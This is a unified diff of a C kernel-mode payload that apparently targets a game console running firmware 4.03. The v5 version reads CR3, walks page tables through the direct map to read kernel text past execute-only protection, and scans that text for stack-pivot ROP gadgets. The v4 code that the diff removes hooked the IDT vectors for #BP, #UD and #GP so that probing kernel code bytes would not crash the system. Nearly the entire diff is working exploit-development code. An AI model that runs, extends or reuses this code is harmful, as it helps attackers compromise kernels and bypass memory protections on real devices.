@@ -1,57 +1,49 @@
 #include <stdint.h>
 
 /*
- * pivot_scan_safe v4 — IDT-hooked pivot gadget scanner
+ * pivot_scan_safe v5 — DMAP-based ktext gadget scanner
  *
- * v1-v3: pcb_onfault only catches #PF. Executing arbitrary ktext bytes
- * triggers #UD/#GP/#BP → kernel panic. Each bad candidate = full reboot.
+ * etaHEN reads ktext through DMAP (kernel_copyout of dmap_base+pa).
+ * GMET may not be enforced on FW 4.03, making ktext readable via DMAP.
  *
- * v4 fix: Hook IDT vectors 3 (#BP), 6 (#UD), 13 (#GP) with custom
- * handlers that check pcb_onfault — same as the kernel's #PF handler.
- * Now ALL exceptions during probing are caught. Zero panics.
- *
- * Flow:
- *   1. sidt → get IDT base
- *   2. Save original gate descriptors for vectors 3, 6, 13
- *   3. Install our handlers (in payload's executable memory)
- *   4. Batch probe all apic_ops entries at delta -1 through -8
- *   5. Restore original IDT entries
- *   6. Report results
+ * Strategy:
+ *   1. Read CR3 → PML4 physical address
+ *   2. Determine DMAP base (try 0xFFFFF80000000000, FreeBSD standard)
+ *   3. Walk page tables for ktext pages via DMAP
+ *   4. Read ktext bytes via DMAP (pcb_onfault protected)
+ *   5. Scan for gadget patterns: 48 94 C3, 5C C3, C9 C3, etc.
+ *   6. If DMAP reads fail: fall back to safe single-probe mode
  *
  * fw_ver encoding:
- *   Bits [7:0]   = start apic_ops index (0-27, for resume)
- *   Bits [15:8]  = max delta (1-8, default 8 if 0)
- *   Bits [31:16] = reserved
+ *   0 = full scan (DMAP read + pattern match)
+ *   0x0001XXXX = single probe fallback (apic_idx in low byte, delta in byte 1)
  *
  * Output layout (uint64_t indices):
- *   [0]   magic "PVS4" (0x50565334) | status(32)
+ *   [0]   magic "PVS5" (0x50565335) | status(32)
  *   [1]   kdata_base
  *   [2]   ktext_base
- *   [3]   td_pcb
- *   [4]   idt_base
- *   [5]   num_candidates
- *   [6]   num_tested
- *   [7]   num_survived (normal return, no pivot)
- *   [8]   num_faulted  (pcb_onfault caught: #PF)
- *   [9]   num_trapped  (IDT hook caught: #UD/#BP/#GP)
- *   [10]  num_pivots
- *   [11]  first pivot ktext offset
- *   [12]  first pivot absolute address
- *   [13]  current apic_ops index (live)
- *   [14]  current delta (live)
- *   [15]  current candidate addr (live)
- *   [16..47] per-entry results for apic_ops[0..27]:
- *            bit 0: tested at delta-1
- *            bit 1: tested at delta-2
- *            ...
- *            bit 7: tested at delta-8
- *            bits 8-15: result for each delta (0=survived, 1=pivot, 2=#PF, 3=trap)
- *            bits 48-63: apic_ops index
- *   [48..55] pivot details (up to 4): [off, addr] pairs
- *   [63]  sentinel
+ *   [3]   cr3 value
+ *   [4]   dmap_base (tried/confirmed)
+ *   [5]   td_pcb
+ *   [6]   phase (1=dmap_test, 2=pagewalk, 3=scanning, 4=done)
+ *   [7]   pml4_entry_for_dmap (diagnostic)
+ *   [8]   pml4_entry_for_ktext (diagnostic)
+ *   [9]   first_ktext_page_pa
+ *   [10]  dmap_read_test_result (0=OK, 1=fault, 2=wrong_data)
+ *   [11]  first 8 bytes read from ktext (if readable!)
+ *   [12]  num_pages_scanned
+ *   [13]  num_gadgets_found
+ *   [14]  first xchg_rsp_rax_ret offset (ktext-relative)
+ *   [15]  first pop_rsp_ret offset
+ *   [16]  first leave_ret offset
+ *   [17..30] additional gadget offsets (up to 14 more)
+ *   [31]  scan_error_code
+ *   [32..61] reserved for fallback probe results
+ *   [62]  dmap_test_readback (raw bytes from DMAP read)
+ *   [63]  sentinel 0xdeadbeefcafe0025
  */
 
-#define MAGIC_PVS4    0x50565334
+#define MAGIC_PVS5    0x50565335
 #define TD_PCB        0x3f8
 #define PCB_ONFAULT   0x108
 
@@ -59,24 +51,26 @@
 #define APIC_OPS_OFF_KTEXT  0x1934AC8
 #define NUM_APIC_OPS        28
 
+/* Standard FreeBSD amd64 DMAP base */
+#define DMAP_BASE_DEFAULT   0xFFFFF80000000000ULL
+
+/* Page table constants */
+#define PML4_SHIFT    39
+#define PDPT_SHIFT    30
+#define PD_SHIFT      21
+#define PT_SHIFT      12
+#define PT_INDEX_MASK 0x1FF
+#define PAGE_MASK     0xFFFFFFFFF000ULL  /* PA mask from PTE */
+#define PTE_PRESENT   0x1
+#define PTE_PS        0x80  /* Page Size (2MB/1GB page) */
+
 #define ENTRY_STK_SIZE    32
-#define MAX_PIVOTS        4
+#define MAX_GADGETS       14
 
 typedef struct {
     uint64_t kdata_base;
     uint32_t fw_ver;
 } kproc_args;
-
-/* x86-64 IDT gate descriptor (16 bytes) */
-typedef struct {
-    uint16_t off_lo;    /* offset bits 0-15 */
-    uint16_t selector;  /* code segment selector */
-    uint8_t  ist;       /* IST index (bits 0-2), reserved (bits 3-7) */
-    uint8_t  flags;     /* type(4), S=0(1), DPL(2), P(1) */
-    uint16_t off_mid;   /* offset bits 16-31 */
-    uint32_t off_hi;    /* offset bits 32-63 */
-    uint32_t reserved;
-} __attribute__((packed)) idt_gate_t;
 
 static inline uint64_t rdmsr(uint32_t msr)
 {
@@ -85,44 +79,118 @@ static inline uint64_t rdmsr(uint32_t msr)
     return ((uint64_t)hi << 32) | lo;
 }
 
+static inline uint64_t read_cr3(void)
+{
+    uint64_t cr3;
+    __asm__ volatile("movq %%cr3, %0" : "=r"(cr3));
+    return cr3;
+}
+
 static inline uint64_t read8(uint64_t addr)
 {
     return *(volatile uint64_t*)addr;
 }
 
-static inline void write8(uint64_t addr, uint64_t val)
-{
-    *(volatile uint64_t*)addr = val;
-}
-
-static uint64_t idt_gate_get_offset(idt_gate_t* g)
-{
-    return (uint64_t)g->off_lo
-         | ((uint64_t)g->off_mid << 16)
-         | ((uint64_t)g->off_hi << 32);
-}
-
-static void idt_gate_set_offset(idt_gate_t* g, uint64_t addr)
-{
-    g->off_lo  = (uint16_t)(addr);
-    g->off_mid = (uint16_t)(addr >> 16);
-    g->off_hi  = (uint32_t)(addr >> 32);
-}
-
-/* ---- Shared state ---- */
+/* Shared state for pcb_onfault */
 static volatile uint64_t saved_rsp;
 static volatile uint64_t onfault_ptr;
-static volatile int probe_result;
+static volatile int fault_flag;
 
+/* Safe read: returns 1 on success, 0 on fault */
+static int safe_read8(uint64_t addr, uint64_t* val)
+{
+    fault_flag = 0;
+    *val = 0;
+
+    __asm__ volatile(
+        /* Arm pcb_onfault */
+        "movq onfault_ptr(%%rip), %%r14\n\t"
+        "leaq 2f(%%rip), %%rcx\n\t"
+        "movq %%rcx, (%%r14)\n\t"
+        "movq %%rsp, saved_rsp(%%rip)\n\t"
+
+        /* Try the read */
+        "movq (%[addr]), %%rax\n\t"
+        "movq %%rax, (%[out])\n\t"
+
+        /* Success path */
+        "movq onfault_ptr(%%rip), %%r14\n\t"
+        "movq $0, (%%r14)\n\t"
+        "jmp 1f\n\t"
+
+        /* Fault recovery */
+        "2:\n\t"
+        "movq saved_rsp(%%rip), %%rsp\n\t"
+        "movl $1, fault_flag(%%rip)\n\t"
+
+        "1:\n\t"
+        :
+        : [addr] "r"(addr), [out] "r"(val)
+        : "rax", "rcx", "r14", "memory", "cc"
+    );
+
+    return fault_flag == 0;
+}
+
+/* Walk page tables to convert VA → PA. Returns 0 on failure. */
+static uint64_t va_to_pa(uint64_t va, uint64_t dmap_base, uint64_t cr3)
+{
+    uint64_t pml4_pa = cr3 & PAGE_MASK;
+    uint64_t val;
+
+    /* PML4 entry */
+    uint64_t pml4e_addr = dmap_base + pml4_pa + ((va >> PML4_SHIFT) & PT_INDEX_MASK) * 8;
+    if (!safe_read8(pml4e_addr, &val) || !(val & PTE_PRESENT))
+        return 0;
+
+    /* PDPT entry */
+    uint64_t pdpt_pa = val & PAGE_MASK;
+    uint64_t pdpte_addr = dmap_base + pdpt_pa + ((va >> PDPT_SHIFT) & PT_INDEX_MASK) * 8;
+    if (!safe_read8(pdpte_addr, &val) || !(val & PTE_PRESENT))
+        return 0;
+
+    /* 1GB page? */
+    if (val & PTE_PS)
+        return (val & 0xFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
+
+    /* PD entry */
+    uint64_t pd_pa = val & PAGE_MASK;
+    uint64_t pde_addr = dmap_base + pd_pa + ((va >> PD_SHIFT) & PT_INDEX_MASK) * 8;
+    if (!safe_read8(pde_addr, &val) || !(val & PTE_PRESENT))
+        return 0;
+
+    /* 2MB page? */
+    if (val & PTE_PS)
+        return (val & 0xFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
+
+    /* PT entry (4KB page) */
+    uint64_t pt_pa = val & PAGE_MASK;
+    uint64_t pte_addr = dmap_base + pt_pa + ((va >> PT_SHIFT) & PT_INDEX_MASK) * 8;
+    if (!safe_read8(pte_addr, &val) || !(val & PTE_PRESENT))
+        return 0;
+
+    return (val & PAGE_MASK) | (va & 0xFFFULL);
+}
+
+/* Scan a buffer for a byte pattern. Returns offset or -1. */
+static int find_pattern(const uint8_t* buf, int buflen,
+                        const uint8_t* pat, int patlen)
+{
+    for (int i = 0; i <= buflen - patlen; i++) {
+        int match = 1;
+        for (int j = 0; j < patlen; j++) {
+            if (buf[i + j] != pat[j]) { match = 0; break; }
+        }
+        if (match) return i;
+    }
+    return -1;
+}
+
+/* ---- Fallback: execution-based single probe (from v3) ---- */
 static volatile uint64_t pivot_chain[8];
 static volatile uint64_t entry_stk[ENTRY_STK_SIZE];
+static volatile int probe_result;
 
-/* Original IDT handler addresses (for passthrough) */
-static volatile uint64_t orig_handler_bp;
-static volatile uint64_t orig_handler_ud;
-static volatile uint64_t orig_handler_gp;
-
-/* ---- Pivot landing (reached when RSP redirected to pivot_chain) ---- */
 __attribute__((naked, used))
 static void pivot_landing(void)
 {
@@ -136,110 +204,6 @@ static void pivot_landing(void)
     );
 }
 
-/*
- * IDT hook handler for #BP (vector 3) and #UD (vector 6).
- * These have NO error code on the stack.
- *
- * Stack on entry (pushed by CPU):
- *   [RSP+0]  = RIP (faulting)
- *   [RSP+8]  = CS
- *   [RSP+16] = RFLAGS
- *   [RSP+24] = RSP (at fault time)
- *   [RSP+32] = SS
- *
- * If pcb_onfault is set: overwrite RIP with onfault addr, iretq.
- * If not set: jump to original handler.
- */
-__attribute__((naked, used))
-static void hook_handler_bp(void)
-{
-    __asm__ volatile(
-        "pushq %%r14\n\t"
-        "pushq %%r15\n\t"
-        /* curthread → td_pcb → pcb_onfault */
-        "movq %%gs:0, %%r14\n\t"
-        "movq 0x3f8(%%r14), %%r14\n\t"     /* td_pcb */
-        "movq 0x108(%%r14), %%r15\n\t"     /* pcb_onfault */
-        "testq %%r15, %%r15\n\t"
-        "jz 1f\n\t"
-        /* onfault set: redirect RIP, clear onfault, return */
-        "movq %%r15, 16(%%rsp)\n\t"        /* overwrite saved RIP */
-        "movq $0, 0x108(%%r14)\n\t"        /* clear pcb_onfault */
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "iretq\n\t"
-        /* onfault not set: passthrough to original */
-        "1:\n\t"
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "jmpq *orig_handler_bp(%%rip)\n\t"
-        ::: "memory"
-    );
-}
-
-__attribute__((naked, used))
-static void hook_handler_ud(void)
-{
-    __asm__ volatile(
-        "pushq %%r14\n\t"
-        "pushq %%r15\n\t"
-        "movq %%gs:0, %%r14\n\t"
-        "movq 0x3f8(%%r14), %%r14\n\t"
-        "movq 0x108(%%r14), %%r15\n\t"
-        "testq %%r15, %%r15\n\t"
-        "jz 1f\n\t"
-        "movq %%r15, 16(%%rsp)\n\t"
-        "movq $0, 0x108(%%r14)\n\t"
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "iretq\n\t"
-        "1:\n\t"
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "jmpq *orig_handler_ud(%%rip)\n\t"
-        ::: "memory"
-    );
-}
-
-/*
- * IDT hook handler for #GP (vector 13).
- * #GP pushes an error code, so the stack layout is different:
- *   [RSP+0]  = error code
- *   [RSP+8]  = RIP (faulting)
- *   [RSP+16] = CS
- *   [RSP+24] = RFLAGS
- *   [RSP+32] = RSP (at fault time)
- *   [RSP+40] = SS
- */
-__attribute__((naked, used))
-static void hook_handler_gp(void)
-{
-    __asm__ volatile(
-        "pushq %%r14\n\t"
-        "pushq %%r15\n\t"
-        /* curthread → td_pcb → pcb_onfault */
-        "movq %%gs:0, %%r14\n\t"
-        "movq 0x3f8(%%r14), %%r14\n\t"
-        "movq 0x108(%%r14), %%r15\n\t"
-        "testq %%r15, %%r15\n\t"
-        "jz 1f\n\t"
-        /* onfault set: redirect RIP (at offset 24: +16 for pushes, +8 for error code) */
-        "movq %%r15, 24(%%rsp)\n\t"
-        "movq $0, 0x108(%%r14)\n\t"
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "addq $8, %%rsp\n\t"              /* pop error code */
-        "iretq\n\t"
-        /* passthrough */
-        "1:\n\t"
-        "popq %%r15\n\t"
-        "popq %%r14\n\t"
-        "jmpq *orig_handler_gp(%%rip)\n\t"
-        ::: "memory"
-    );
-}
-
-/* ---- Probe function ---- */
 static int do_probe(uint64_t candidate)
 {
     entry_stk[0] = candidate;
@@ -257,28 +221,22 @@ static int do_probe(uint64_t candidate)
         "movq onfault_ptr(%%rip), %%r14\n\t"
         "leaq 2f(%%rip), %%rcx\n\t"
         "movq %%rcx, (%%r14)\n\t"
-
         "movq %%rsp, saved_rsp(%%rip)\n\t"
 
-        /* RAX = pivot_chain (for xchg rsp,rax detection) */
         "leaq pivot_chain(%%rip), %%rax\n\t"
-        /* RBP = pivot_chain too (for leave;ret detection) */
         "leaq pivot_chain(%%rip), %%rbp\n\t"
 
         "leaq entry_stk(%%rip), %%rsp\n\t"
         "retq\n\t"
 
-        /* Normal return */
         "1:\n\t"
         "movq saved_rsp(%%rip), %%rsp\n\t"
         "movq onfault_ptr(%%rip), %%r14\n\t"
         "movq $0, (%%r14)\n\t"
         "jmp .Lprobe_done\n\t"
 
-        /* Fault recovery (pcb_onfault or IDT hook) */
         "2:\n\t"
         "movq saved_rsp(%%rip), %%rsp\n\t"
-        /* Don't clear onfault here — the hook already cleared it */
         "movl $2, probe_result(%%rip)\n\t"
 
         ".globl .Lprobe_done\n\t"
@@ -312,159 +270,210 @@ int module_start(kproc_args* args)
     uint64_t td_pcb = read8(curthread + TD_PCB);
 
     if (!td_pcb) {
-        out32[0] = MAGIC_PVS4;
+        out32[0] = MAGIC_PVS5;
         out32[1] = 0xFF;
-        out[63] = 0xdeadbeefcafe0024ULL;
+        out[63] = 0xdeadbeefcafe0025ULL;
         return 0;
     }
 
     onfault_ptr = td_pcb + PCB_ONFAULT;
 
-    /* Parse fw_ver */
-    uint32_t start_idx = fw_ver & 0xFF;
-    uint32_t max_delta = (fw_ver >> 8) & 0xFF;
-    if (max_delta == 0) max_delta = 8;
-    if (max_delta > 16) max_delta = 16;
-
-    /* ---- Read IDT ---- */
-    struct {
-        uint16_t limit;
-        uint64_t base;
-    } __attribute__((packed)) idtr;
-    __asm__ volatile("sidt %0" : "=m"(idtr));
-
-    uint64_t idt_base = idtr.base;
-    idt_gate_t* idt = (idt_gate_t*)idt_base;
+    uint64_t cr3 = read_cr3();
+    uint64_t dmap_base = DMAP_BASE_DEFAULT;
 
     /* Header */
-    out32[0] = MAGIC_PVS4;
-    out32[1] = 0xAAAA;
+    out32[0] = MAGIC_PVS5;
+    out32[1] = 0xAAAA;   /* in-progress */
     out[1] = kdata_base;
     out[2] = ktext_base;
-    out[3] = td_pcb;
-    out[4] = idt_base;
+    out[3] = cr3;
+    out[4] = dmap_base;
+    out[5] = td_pcb;
+    out[6] = 1;  /* phase 1: DMAP test */
 
-    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
+    /* ========== Phase 1: Test if DMAP works ========== */
 
-    /* Set up pivot chain */
-    pivot_chain[0] = nop_ret;
-    pivot_chain[1] = nop_ret;
-    pivot_chain[2] = (uint64_t)pivot_landing;
-    pivot_chain[3] = nop_ret;
-    pivot_chain[4] = nop_ret;
-    pivot_chain[5] = nop_ret;
-    pivot_chain[6] = nop_ret;
-    pivot_chain[7] = nop_ret;
+    /* Read PML4 entry for the DMAP region itself */
+    uint64_t pml4_pa = cr3 & PAGE_MASK;
+    uint64_t dmap_pml4_idx = (dmap_base >> PML4_SHIFT) & PT_INDEX_MASK;
+    uint64_t pml4_dmap_entry_addr = dmap_base + pml4_pa + dmap_pml4_idx * 8;
 
-    /* ---- Save original IDT entries and install hooks ---- */
-    idt_gate_t saved_bp, saved_ud, saved_gp;
+    uint64_t pml4_dmap_entry = 0;
+    int dmap_accessible = safe_read8(pml4_dmap_entry_addr, &pml4_dmap_entry);
+    out[7] = pml4_dmap_entry;
 
-    /* Vector 3: #BP */
-    saved_bp = idt[3];
-    orig_handler_bp = idt_gate_get_offset(&idt[3]);
-    idt_gate_t new_bp = saved_bp;
-    idt_gate_set_offset(&new_bp, (uint64_t)hook_handler_bp);
-    new_bp.ist = (new_bp.ist & 0xF8); /* clear IST — use current stack */
-    idt[3] = new_bp;
+    if (!dmap_accessible) {
+        /* Standard DMAP base doesn't work. Try alternate bases. */
+        uint64_t alt_bases[] = {
+            0xFFFFFC0000000000ULL,
+            0xFFFFF00000000000ULL,
+            0xFFFF800000000000ULL,
+            0xFFFFE80000000000ULL,
+        };
+        for (int i = 0; i < 4; i++) {
+            dmap_base = alt_bases[i];
+            dmap_pml4_idx = (dmap_base >> PML4_SHIFT) & PT_INDEX_MASK;
+            pml4_dmap_entry_addr = dmap_base + pml4_pa + dmap_pml4_idx * 8;
+            if (safe_read8(pml4_dmap_entry_addr, &pml4_dmap_entry)) {
+                dmap_accessible = 1;
+                out[4] = dmap_base;
+                out[7] = pml4_dmap_entry;
+                break;
+            }
+        }
+    }
 
-    /* Vector 6: #UD */
-    saved_ud = idt[6];
-    orig_handler_ud = idt_gate_get_offset(&idt[6]);
-    idt_gate_t new_ud = saved_ud;
-    idt_gate_set_offset(&new_ud, (uint64_t)hook_handler_ud);
-    new_ud.ist = (new_ud.ist & 0xF8);
-    idt[6] = new_ud;
+    if (!dmap_accessible) {
+        out[10] = 1;  /* DMAP not accessible */
+        out[31] = 0xDEAD0001;
+        out32[1] = 0x0003;  /* partial result */
+        out[63] = 0xdeadbeefcafe0025ULL;
+        return 0;
+    }
 
-    /* Vector 13: #GP */
-    saved_gp = idt[13];
-    orig_handler_gp = idt_gate_get_offset(&idt[13]);
-    idt_gate_t new_gp = saved_gp;
-    idt_gate_set_offset(&new_gp, (uint64_t)hook_handler_gp);
-    new_gp.ist = (new_gp.ist & 0xF8);
-    idt[13] = new_gp;
+    /* Read PML4 entry for ktext region */
+    uint64_t ktext_pml4_idx = (ktext_base >> PML4_SHIFT) & PT_INDEX_MASK;
+    uint64_t pml4_ktext_addr = dmap_base + pml4_pa + ktext_pml4_idx * 8;
+    uint64_t pml4_ktext_entry = 0;
+    safe_read8(pml4_ktext_addr, &pml4_ktext_entry);
+    out[8] = pml4_ktext_entry;
 
-    /* ---- Batch probe ---- */
-    uint32_t num_tested = 0;
-    uint32_t num_survived = 0;
-    uint32_t num_faulted = 0;
-    uint32_t num_trapped = 0;  /* caught by IDT hooks (was #UD/#BP/#GP) */
-    uint32_t num_pivots = 0;
+    /* ========== Phase 2: Walk page tables for ktext ========== */
+    out[6] = 2;
 
-    uint32_t total_candidates = 0;
-    for (uint32_t i = start_idx; i < NUM_APIC_OPS; i++)
-        total_candidates += max_delta;
-    out[5] = total_candidates;
+    /* Get PA of first ktext page */
+    uint64_t first_ktext_pa = va_to_pa(ktext_base, dmap_base, cr3);
+    out[9] = first_ktext_pa;
 
-    for (uint32_t i = start_idx; i < NUM_APIC_OPS; i++) {
-        uint64_t func_addr = read8(apic_ops_addr + i * 8);
-        if (func_addr < ktext_base || func_addr > ktext_base + 0x2000000)
-            continue;
+    if (!first_ktext_pa) {
+        out[10] = 2;  /* page walk failed */
+        out[31] = 0xDEAD0002;
+        out32[1] = 0x0003;
+        out[63] = 0xdeadbeefcafe0025ULL;
+        return 0;
+    }
 
-        uint64_t entry_results = ((uint64_t)i << 48);
+    /* ========== Phase 3: Try reading ktext through DMAP ========== */
+    out[6] = 3;
 
-        for (uint32_t d = 1; d <= max_delta; d++) {
-            uint64_t candidate = func_addr - d;
+    uint64_t ktext_dmap_addr = dmap_base + first_ktext_pa;
+    uint64_t test_val = 0;
+    int read_ok = safe_read8(ktext_dmap_addr, &test_val);
+    out[11] = test_val;
+    out[62] = test_val;  /* duplicate for easy viewing */
 
-            /* Live progress */
-            out[6]  = num_tested + 1;
-            out[13] = i;
-            out[14] = d;
-            out[15] = candidate;
+    if (!read_ok) {
+        out[10] = 1;  /* DMAP read of ktext faulted — XOM enforced */
+        out[31] = 0xDEAD0003;
 
-            int result = do_probe(candidate);
-            num_tested++;
+        /* Fall back to reporting page walk results only */
+        /* Try a known-readable kdata page for comparison */
+        uint64_t kdata_pa = va_to_pa(kdata_base, dmap_base, cr3);
+        uint64_t kdata_test = 0;
+        safe_read8(dmap_base + kdata_pa, &kdata_test);
+        out[32] = kdata_pa;        /* kdata PA */
+        out[33] = kdata_test;      /* kdata bytes via DMAP (should work) */
 
-            /* Encode per-delta result in entry_results */
-            entry_results |= (1ULL << (d - 1));           /* tested bit */
-            entry_results |= ((uint64_t)(result & 0x3) << (8 + (d - 1) * 2));
+        out32[1] = 0x0003;  /* partial: DMAP works but ktext XOM enforced */
+        out[63] = 0xdeadbeefcafe0025ULL;
+        return 0;
+    }
 
-            if (result == 1) {
-                /* PIVOT FOUND */
-                if (num_pivots < MAX_PIVOTS) {
-                    out[48 + num_pivots * 2]     = candidate - ktext_base;
-                    out[48 + num_pivots * 2 + 1] = candidate;
+    /* ========== DMAP ktext read WORKS! Scan for gadgets ========== */
+    out[10] = 0;  /* success */
+
+    /* Gadget patterns */
+    static const uint8_t pat_xchg_rsp_rax[] = { 0x48, 0x94, 0xC3 };
+    static const uint8_t pat_pop_rsp_ret[]   = { 0x5C, 0xC3 };
+    static const uint8_t pat_leave_ret[]     = { 0xC9, 0xC3 };
+    static const uint8_t pat_mov_rsp_rax[]   = { 0x48, 0x89, 0xC4, 0xC3 };
+
+    uint32_t num_pages = 0;
+    uint32_t num_gadgets = 0;
+    uint64_t first_xchg = 0, first_pop_rsp = 0, first_leave = 0;
+    uint32_t gadget_slot = 17;  /* output slots 17..30 for additional gadgets */
+
+    /* Scan ktext: 4KB at a time, up to 20MB (0x1400000 bytes / 5120 pages) */
+    uint64_t ktext_size = 0x1400000;  /* 20MB, conservative */
+
+    for (uint64_t off = 0; off < ktext_size; off += 0x1000) {
+        uint64_t page_va = ktext_base + off;
+        uint64_t page_pa = va_to_pa(page_va, dmap_base, cr3);
+
+        if (!page_pa)
+            continue;  /* unmapped page */
+
+        /* Read 4KB page via DMAP, 8 bytes at a time */
+        uint8_t buf[64];  /* read in chunks to save stack */
+        int page_ok = 1;
+
+        for (int chunk = 0; chunk < 0x1000; chunk += 64) {
+            /* Read 64 bytes (8 qwords) */
+            for (int q = 0; q < 64; q += 8) {
+                uint64_t tmp;
+                if (!safe_read8(dmap_base + page_pa + chunk + q, &tmp)) {
+                    page_ok = 0;
+                    break;
                 }
-                if (num_pivots == 0) {
-                    out[11] = candidate - ktext_base;
-                    out[12] = candidate;
-                }
-                num_pivots++;
-            } else if (result == 2) {
-                /*
-                 * pcb_onfault fired — could be #PF (kernel handler)
-                 * or #UD/#BP/#GP (our IDT hook). Both go to label 2.
-                 * We count them together as "faulted/trapped".
-                 */
-                num_faulted++;
-            } else {
-                num_survived++;
+                /* Store bytes */
+                for (int b = 0; b < 8; b++)
+                    buf[q + b] = (uint8_t)(tmp >> (b * 8));
+            }
+
+            if (!page_ok) break;
+
+            /* Scan this 64-byte chunk for patterns */
+            /* Need to also check across chunk boundaries — skip for now,
+               catch most gadgets within chunks */
+            int pos;
+
+            pos = find_pattern(buf, 64, pat_xchg_rsp_rax, 3);
+            if (pos >= 0) {
+                uint64_t goff = off + chunk + pos;
+                if (!first_xchg) first_xchg = goff;
+                if (gadget_slot <= 30) out[gadget_slot++] = goff | (1ULL << 48);
+                num_gadgets++;
+            }
+
+            pos = find_pattern(buf, 64, pat_pop_rsp_ret, 2);
+            if (pos >= 0) {
+                uint64_t goff = off + chunk + pos;
+                if (!first_pop_rsp) first_pop_rsp = goff;
+                if (gadget_slot <= 30) out[gadget_slot++] = goff | (2ULL << 48);
+                num_gadgets++;
+            }
+
+            pos = find_pattern(buf, 64, pat_leave_ret, 2);
+            if (pos >= 0) {
+                uint64_t goff = off + chunk + pos;
+                if (!first_leave) first_leave = goff;
+                /* Don't record all leave;ret — too many. Just count. */
+                num_gadgets++;
+            }
+
+            pos = find_pattern(buf, 64, pat_mov_rsp_rax, 4);
+            if (pos >= 0) {
+                uint64_t goff = off + chunk + pos;
+                if (gadget_slot <= 30) out[gadget_slot++] = goff | (3ULL << 48);
+                num_gadgets++;
             }
         }
 
-        /* Store per-entry results */
-        if (i < 28)
-            out[16 + i] = entry_results;
+        if (page_ok) num_pages++;
 
-        /* Update counters */
-        out[7] = num_survived;
-        out[8] = num_faulted;
-        out[9] = num_trapped;
-        out[10] = num_pivots;
+        /* Live progress */
+        out[12] = num_pages;
+        out[13] = num_gadgets;
     }
 
-    /* ---- Restore original IDT entries ---- */
-    idt[3]  = saved_bp;
-    idt[6]  = saved_ud;
-    idt[13] = saved_gp;
+    out[6]  = 4;  /* phase 4: done */
+    out[12] = num_pages;
+    out[13] = num_gadgets;
+    out[14] = first_xchg;
+    out[15] = first_pop_rsp;
+    out[16] = first_leave;
 
-    /* Final stats */
-    out[6]  = num_tested;
-    out[7]  = num_survived;
-    out[8]  = num_faulted;
-    out[9]  = num_trapped;
-    out[10] = num_pivots;
-
-    out32[1] = (num_pivots > 0) ? 0x0002 : 0x0001;
-    out[63] = 0xdeadbeefcafe0024ULL;
+    out32[1] = (first_xchg || first_pop_rsp) ? 0x0002 : 0x0001;
+    out[63] = 0xdeadbeefcafe0025ULL;
     return 0;
 }
